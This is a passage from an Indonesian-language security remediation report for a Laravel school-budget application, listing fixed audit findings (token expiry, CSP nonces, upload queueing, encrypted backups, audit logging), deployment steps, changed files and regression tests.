2. **R-02 Siklus hidup token API — ✅ selesai.** Kolom `api_token_expires_at` & `api_token_used_at`; token berlaku `API_TOKEN_UMUR_HARI` (default 180 hari), ditolak 401 setelah kedaluwarsa, jejak pemakaian dicatat (maks. 1×/10 menit), tombol **Cabut Token** di Profil, serta audit setiap penerbitan/pencabutan. Pencabutan otomatis saat akun dinonaktifkan/sandi berubah tetap berlaku.
3. **R-03 Header keamanan — ✅ ditutup pada kode; verifikasi browser masih perlu.** `X-Frame-Options: SAMEORIGIN`, `default-src` dan direktif sumber CSP diterapkan, dan setiap blok `<script>` Blade memakai nonce acak per respons (nonce dipasang oleh template tepercaya, bukan dengan memodifikasi HTML keluaran). Seluruh **80** handler atribut inline di **37** berkas Blade (`onclick` 35, `onsubmit` 21, `onchange` 18, `oninput` 6) sudah dipindah ke `data-*` + `addEventListener`: `resources/js/app.js` untuk sidebar/grup menu, `resources/views/layouts/_interaksi.blade.php` untuk konfirmasi, autosubmit, cetak, dan status tombol, serta skrip nonce per halaman untuk tabel dinamis. Karena itu `script-src-attr` kini `'none'` (bukan `'unsafe-inline'`, tanpa hash untuk handler) sementara `script-src` tetap memakai nonce + `https://cdn.jsdelivr.net`. `style-src` tidak diubah karena atribut/blok `style` inline masih dipakai luas. Inventaris per berkas dan catatan semantik ada di `docs/R-03-INVENTARIS-HANDLER-INLINE.md`; regresi otomatis ada di `tests/Feature/CspHandlerInlineTest.php` (header CSP, pindai semua view, markup ter-render, kontrak lapisan interaksi). Yang **belum** dilakukan pada lingkungan ini: uji klik di browser sungguhan (dialog konfirmasi, cetak, clipboard) dan eksekusi suite PHPUnit — lihat §2. Dua halaman HTML statis di `public/` (`pendamping-arkas.html`, `ARKAS4-Pendamping-Sekolah.html`) masih memakai handler atribut, tetapi disajikan langsung oleh web server tanpa melewati middleware Laravel sehingga tidak menerima CSP; bila kelak disajikan lewat Laravel, keduanya harus dimigrasi.
4. **R-04 DoS / unggahan — ✅ ditutup pada kode aplikasi.** Limit bernama `unggah` (10/10 menit), `unggah-api` (6/10 menit), status browser (30/menit) dan status API (25/menit) melindungi antrean; validasi ukuran 20 MB/40 MB serta lampiran maks. 10 berkas tetap berlaku. Impor XLSX utama, cek integritas, rekonsiliasi, impor CSV RKAS (maks. 2 MB), dan API `/arkas-push` kini seluruhnya disalin ke disk privat dan diproses oleh satu worker queue dengan run ID, isolasi pemilik sekolah/pengguna, larangan unggah kedua saat masih ada pekerjaan aktif, status polling, perlindungan job duplikat, pemeriksaan ZIP XLSX (maks. 512 entri/200 MiB terurai, rasio kompresi dibatasi), file 0600 dan timeout 600 detik, dua percobaan, serta penghapusan file ketika selesai/gagal. Pembersihan terjadwal menandai run macet setelah 24 jam, membersihkan file yatim, serta menghapus riwayat 90 hari. Tes regresi ditambah untuk ketiga alur browser/API dan impor CSV. Deployment tetap harus menjalankan worker `imports` dan scheduler.
5. **R-05 Email massal — ✅ selesai.** `pengumumanStore` dibatasi `throttle:pengumuman` (5/jam per akun), hanya mengirim ke akun **aktif**, jumlah penerima dibatasi `PENGUMUMAN_MAKS_PENERIMA` (default 3000) dengan pemberitahuan bila terpotong, email dikirim lewat `KirimEmailNotif` pada koneksi queue non-sync (sinkron hanya untuk mode uji/demo), dan setiap pengumuman dicatat di jejak audit.
6. **R-06 Konfigurasi produksi — ✅ selesai.** `.env.example` kini `APP_DEBUG=false` + dokumentasi `SESSION_SECURE_COOKIE`/`SESSION_ENCRYPT`/`LOG_LEVEL`. `AppServiceProvider` menulis peringatan ke log bila `APP_DEBUG=true` di produksi atau bila `APP_URL` https tetapi cookie sesi belum `secure`.
7. **R-07 Host header — ✅ selesai.** `$middleware->trustHosts(at: …)` di `bootstrap/app.php`, dikonfigurasi lewat `TRUSTED_HOSTS` (mis. `siapbosp.makassar.go.id,*.makassar.go.id`); bila kosong, berlaku bawaan Laravel (host `APP_URL` + subdomain).
8. **R-08 `sync_states` — ✅ selesai.** Baris `sync_states` hanya ditampilkan di aplikasi portabel (satu sekolah per perangkat); di server pusat disembunyikan karena tidak relevan dan berpotensi membocorkan jejak perangkat.
9. **R-09 Pemisahan peran — ✅ selesai.** Aturan peran tetap dipusatkan pada `App\Support\Peran` dan kini dipanggil melalui Gate `manage-user` serta `assign-user-role`. Gate kemampuan `backup`, `allocation`, dan `master-data` diterapkan pada aksi terkait; pemeriksaan dilakukan server-side dan bukan hanya menyembunyikan tombol.
10. **R-10 Backup — ✅ selesai.** Backup otomatis harian pukul 02.00 menurut `config('app.timezone')` (default UTC) dibuat oleh `backup:automatic`, disimpan privat di `storage/app/private/backups/`, dienkripsi AES-256, memakai berkas sementara `0600`, dan retensinya dapat diatur lewat `BACKUP_RETENTION_DAYS` (default 30 hari). Mendukung snapshot SQLite (`VACUUM INTO`) dan PostgreSQL (`pg_dump`); tugas gagal tertutup bila `BACKUP_PASSWORD` atau dukungan AES-256 tidak tersedia. Scheduler server tetap perlu dijalankan.
11. **R-11 `pg_dump` — ✅ selesai.** Fitur hanya jalan bila driver `pgsql` (SQLite diarahkan ke backup ZIP), pencarian biner lewat `command -v` + glob `/usr/lib/postgresql/*/bin/pg_dump`, dan keluaran perintah **tidak** lagi ditampilkan ke pengguna (hanya kode galat; detail ke log server).
12. **R-12 Jejak audit — ◐ jalur kode siap, verifikasi SIEM produksi menunggu konfigurasi.** `ActivityLog` append-only, tidak ikut terhapus saat reset data; setiap peristiwa tersimpan pada tabel dan salinan lokal harian `storage/logs/audit-*.log` (retensi `AUDIT_LOG_DAYS`, izin `0600`). `AUDIT_REMOTE_CHANNEL=syslog` menyalin ke syslog sistem, atau `AUDIT_REMOTE_CHANNEL=socket` + `AUDIT_REMOTE_URL=tls://host:port` mengirim JSON newline-delimited langsung melalui TLS ke collector. Salinan lokal tetap aktif; error remote tidak menggagalkan aksi aplikasi dan koneksi dibatasi dua detik. Konfigurasi TLS memakai validasi sertifikat PHP/OpenSSL standar. Karena target, format penerimaan, kebijakan jaringan, dan kebutuhan mTLS SIEM belum tersedia, konektivitas serta penerimaan event produksi belum diuji; ini tetap *partial operational closure*, bukan klaim SIEM aktif.

**Operasional setelah deploy:**
- Antrean R-04/R-05: jalankan migrasi baru dan worker persisten terpisah: `php artisan queue:work database --queue=imports --timeout=600 --tries=2` (`DB_QUEUE_RETRY_AFTER` >600 detik; contoh `.env.example`: 720) serta `php artisan queue:work database --queue=default --timeout=90 --tries=3` untuk email. Jalankan scheduler agar `arkas-imports:prune` menutup run macet dan membersihkan file/riwayat. Worker dan scheduler adalah syarat layanan; tanpa worker, impor tetap aman tetapi tidak selesai dan email antre tidak terkirim.
- Backup terjadwal R-10: set `BACKUP_PASSWORD` sebagai rahasia kuat dan terpisah dari backup, set `BACKUP_RETENTION_DAYS`, lalu daftarkan `php artisan schedule:run` setiap menit pada cron/scheduler host. Verifikasi hasil `php artisan backup:automatic` dan uji ekstraksi ZIP.
- SIEM R-12: pilih salah satu (a) `AUDIT_REMOTE_CHANNEL=syslog` dan konfigurasikan daemon syslog host untuk forward; atau (b) `AUDIT_REMOTE_CHANNEL=socket` serta `AUDIT_REMOTE_URL=tls://FQDN:PORT` pada receiver yang menerima JSON newline-delimited. Pastikan sertifikat server sah/trusted, izinkan egress firewall, lalu kirim event uji dan konfirmasi diterima pada SIEM. Jangan menandai R-12 operasional selesai sebelum uji ini lolos.
- Tetap isi `TRUSTED_PROXIES`/`TRUSTED_HOSTS` dengan benar, pastikan `/pengaturan/backup/unduh` menghasilkan 403 untuk operator di server pusat, lalu jalankan `php artisan test` di lingkungan ber-PHP.

---

## 6. Berkas yang berubah

| Berkas | Perubahan |
|---|---|
| `app/Support/Csv.php` *(baru)* | Netralisir formula CSV/XLSX |
| `app/Http/Middleware/KeamananHeader.php` *(baru)* | Header keamanan dasar |
| `app/Http/Middleware/PastikanAkunAktif.php` *(baru)* | Tolak akun/sekolah nonaktif pada **semua** rute bersesi (bukan hanya `role:*`) |
| `app/Http/Middleware/EnsureRole.php` | Tolak akun/sekolah nonaktif + putus sesi |
| `app/Http/Middleware/ApiTokenAuth.php` | Tolak token akun/sekolah nonaktif (403) |
| `bootstrap/app.php` | `TRUSTED_PROXIES` eksplisit (bukan `*`), daftarkan header keamanan |
| `app/Http/Controllers/PengaturanController.php` | Batasi dump DB, filter log per sekolah |
| `app/Http/Controllers/ArsipController.php` | Filter riwayat impor/ekspor per sekolah |
| `app/Http/Controllers/DinasController.php` | Guard `pastikanBolehKelola` (4 aksi), tolak `superadmin` dari impor CSV, sanitasi CSV konsolidasi |
| `app/Http/Controllers/ProfilController.php` | Sinkron pagu hanya Dinas + audit perubahan parameter |
| `app/Services/JuknisBosp2026Service.php` | `$pakaiEstimasi` — tinjauan Dinas hanya memakai alokasi resmi |
| `app/Http/Controllers/LoginController.php` | Pembatas percobaan login per-IP; ikat sesi ke hash sandi |
| `app/Http/Controllers/LampiranController.php` | Validasi `array|max:10` |
| `app/Http/Controllers/HppController.php` | Cek kepemilikan `KasDetail`/`RkasDetail` (anti IDOR tulis) |
| `app/Http/Controllers/{Pembukuan,Laporan,LaporanArkas}Controller.php` | Sanitasi CSV |
| `app/Services/{Backup,KonsolidasiExport,LpjExport,RkasExport}Service.php` | Penyamaran token lebih ketat; sanitasi XLSX; nama berkas unduhan dibersihkan |
| `app/Services/ArkasImportService.php` | Impor ARKAS tidak lagi menetapkan pagu resmi (hanya Dinas/portabel) |
| `app/Support/Sandi.php` *(baru)* | Kebijakan kata sandi (R-01) |
| `app/Rules/SandiKuat.php` *(baru)* | Aturan validasi sandi kuat |
| `app/Support/TokenApi.php` *(baru)* | Terbit/cabut token, masa berlaku, jejak pemakaian (R-02) |
| `app/Support/Peran.php` *(baru)* | Pemisahan tugas dinas vs superadmin (R-09) |
| `app/Models/ActivityLog.php` | *Append-only*: ubah/hapus ditolak (R-12) |
| `app/Services/{Backup,Aktivitas,HapusData}Service.php` | Backup terenkripsi 0600; salinan log ke `audit.log`; reset data tidak menghapus log |
| `app/Http/Middleware/KeamananHeader.php` | `X-Frame-Options` + CSP `frame-ancestors` (R-03); `script-src-attr 'none'` setelah migrasi handler |
| `app/Http/Middleware/PastikanAkunAktif.php` | Paksa ganti sandi akun hasil impor/reset (R-01) |
| `app/Http/Middleware/ApiTokenAuth.php` | Tolak token kedaluwarsa, catat pemakaian (R-02) |
| `app/Providers/AppServiceProvider.php` | Pembatas unggah/status impor (R-04), pengumuman (R-05), peringatan konfigurasi produksi (R-06) |
| `bootstrap/app.php` | `TRUSTED_HOSTS` (R-07) |
| `app/Http/Controllers/ArsipController.php` | `sync_states` hanya di instalasi portabel (R-08) |
| `database/migrations/2026_10_25_000001_…` *(baru)* | `must_change_password`, `api_token_expires_at`, `api_token_used_at` |
| `config/logging.php` | Kanal `audit` (R-12) |
| `.env.example` | `TRUSTED_HOSTS`, `BACKUP_PASSWORD`, `API_TOKEN_UMUR_HARI`, `PENGUMUMAN_MAKS_PENERIMA`, `APP_DEBUG=false`, catatan sesi HTTPS |
| `tests/Feature/PerbaikanLanjutanTest.php`, `tests/Feature/{CekIntegritas,Rekonsiliasi}Test.php`, `tests/Unit/ArsipXlsxAmanTest.php` | Regresi R-01…R-12, Gate/CSP, antrean XLSX/CSV, isolasi status, dan ZIP-bomb screening |
| `app/Http/Controllers/UnduhAplikasiController.php` | Nama berkas paket portabel memakai NPSN yang disanitasi |
| `app/Models/School.php` | Cast `is_active` → boolean (dasar pemeriksaan status sekolah) |
| `resources/views/pengaturan/backup.blade.php` | Sembunyikan tombol unduh bagi yang tidak berhak |
| `resources/views/utility/profil.blade.php` | Checkbox sinkron pagu hanya tampil bagi yang berhak (Dinas/portabel) |
| `resources/views/rkas/show.blade.php` | Mode tinjauan Dinas tidak memakai estimasi pagu sekolah |
| `.env.example` | `TRUSTED_PROXIES` |
| `tests/Feature/KeamananAuditTest.php` *(baru)* | 20 uji regresi temuan K-01…K-08 |
| `tests/Unit/CsvTest.php` *(baru)* | 3 uji netralisir formula (`App\Support\Csv`, tanpa DB) |
| `tests/Feature/MenuDanArsipTest.php` | Ekspektasi backup disesuaikan (403 di server pusat) |
| `app/Services/AntreanArkasService.php`, `app/Services/ArsipXlsxAman.php`, `app/Services/RkasCsvImportService.php`, `app/Jobs/ProsesImporArkas.php`, `app/Models/ArkasImportRun.php`, migrations `000002` + `000003` | Queue privat/status terisolasi untuk XLSX impor, cek integritas, rekonsiliasi, API, CSV RKAS, dan pemeriksaan arsip XLSX sebelum parse (R-04) |
| `app/Console/Commands/BersihkanImporArkas.php`, `routes/console.php` | Tandai pekerjaan stale, retensi run 90 hari, bersihkan berkas yatim (R-04) |
| `app/Http/Controllers/{Api,ImportArkas,CekIntegritas,Rekonsiliasi,Rkas}Controller.php`, `resources/views/impor-arkas/status.blade.php` | Kontrak async, polling berizin, respons hasil tiap jenis pekerjaan (R-04) |
| `app/Console/Commands/BackupOtomatis.php`, `app/Services/BackupTerjadwalService.php`, `config/backup.php`, `routes/console.php` | Backup terenkripsi otomatis harian + retensi (R-10) |
| `config/logging.php`, `.env.example` | Stack audit lokal + syslog host atau socket TLS JSON langsung (R-12; koneksi produksi belum diverifikasi) |
| `app/Providers/AppServiceProvider.php`, `app/Http/Controllers/{Dinas,Pengaturan}Controller.php` | Gate `manage-user`, `assign-user-role`, `backup`, `allocation`, `master-data` (R-09) |
| `app/Http/Middleware/KeamananHeader.php`, `resources/views/**`, `resources/js/app.js` | CSP sumber-per-origin + nonce script inline; handler atribut inline dimigrasi ke `data-*` + `addEventListener` dan `script-src-attr` ditutup `'none'` (R-03) |
| `resources/views/layouts/_interaksi.blade.php` *(baru)*, `tests/Feature/CspHandlerInlineTest.php` *(baru)*, `docs/R-03-INVENTARIS-HANDLER-INLINE.md` *(baru)* | Lapisan interaksi non-inline, regresi CSP/handler, dan inventaris migrasi (R-03) |
| `resources/views/errors/{401,403,404,419,429,500,503}.blade.php`, `resources/views/layouts/error.blade.php` | Halaman error ramah pengguna tanpa detail exception/stack trace |
| `tests/Feature/HalamanErrorTest.php` | Regresi tampilan 404 dan 500 generik |
| `tests/Feature/RouteControllerResolutionTest.php` *(baru)* | Regresi untuk memastikan rute controller merujuk kelas dan method yang tersedia |
| `tests/Feature/PerbaikanLanjutanTest.php`, `tests/Feature/BackupTerjadwalTest.php` | Regresi antrean impor, CSP, Gate, enkripsi dan retensi backup |

---

## 7. Lampiran — reproduksi pengujian

```bash
# seluruh suite
php artisan test

# khusus temuan audit ini
php artisan test --filter=KeamananAuditTest

# uji isolasi multi-tenant yang sudah ada
php artisan test --filter=MultiTenantIsolationTest
```

Daftar uji regresi baru:

1. `test_akun_sekolah_tidak_bisa_mengunduh_dump_basis_data_penuh`
2. `test_hanya_superadmin_atau_mode_portabel_yang_boleh_mengunduh_backup`
3. `test_dinas_tidak_bisa_mereset_sandi_superadmin`
4. `test_dinas_tidak_bisa_mengubah_email_atau_menghapus_superadmin`
5. `test_log_sistem_hanya_menampilkan_aktivitas_sekolah_sendiri`
6. `test_riwayat_impor_dan_ekspor_tidak_membocorkan_sekolah_lain`
7. `test_token_api_akun_nonaktif_ditolak`
8. `test_token_api_sekolah_nonaktif_ditolak`
9. `test_sesi_akun_yang_dinonaktifkan_langsung_diputus`
10. `test_ekspor_bku_menetralkan_formula_csv_injection`
11. `test_tidak_bisa_memetakan_rincian_belanja_sekolah_lain_lewat_hpp`
12. `test_sekolah_tidak_bisa_menulis_pagu_lewat_profil`
13. `test_csp_memakai_nonce_acak_di_script_inline`
14. `test_unggahan_arkas_dikirim_ke_antrean_dan_dibatasi_milik_pengunggah`
15. `test_gate_memisahkan_kemampuan_akun_alokasi_master_dan_backup`
16. `test_backup_sqlite_terenkripsi_dan_retensi_menghapus_berkas_lama`
17. `test_arkas_push_api_mengantrikan_berkas_dengan_token_dan_membatasi_status`
18. `test_unggahan_cek_integritas_diproses_asinkron_dan_berkasnya_privat`
19. `test_unggahan_rekonsiliasi_diproses_asinkron_dan_berkasnya_privat`
20. `test_impor_csv_rkas_dibatasi_dan_dikirim_ke_antrean`
21. `test_fixture_xlsx_valid_lolos_pemeriksaan_arsip`
22. `test_entri_jalur_traversal_di_arsip_ditolak`
